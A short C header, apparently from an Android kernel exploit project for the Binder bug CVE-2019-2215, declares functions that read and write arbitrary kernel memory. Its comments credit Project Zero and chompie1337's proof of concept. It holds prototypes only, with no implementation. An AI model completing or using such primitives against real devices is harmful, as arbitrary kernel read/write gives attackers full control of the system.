#include <stdbool.h>
#include <unistd.h>
#include <stdio.h>

// RW primitives
// stolen from google's PoC / chompie1337's code
// https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885
// https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/kernel_rw.c

bool kernel_write(unsigned long kaddr, void *buf, unsigned long len);
bool kernel_read(unsigned long kaddr, void *buf, unsigned long len);

unsigned long kernel_read_uchar(unsigned long kaddr);
unsigned long kernel_read_uint(unsigned long kaddr);
unsigned long kernel_read_ulong(unsigned long kaddr);

void kernel_write_uchar(unsigned long kaddr, unsigned char data);
void kernel_write_uint(unsigned long kaddr, unsigned int data);
void kernel_write_ulong(unsigned long kaddr, unsigned long data);
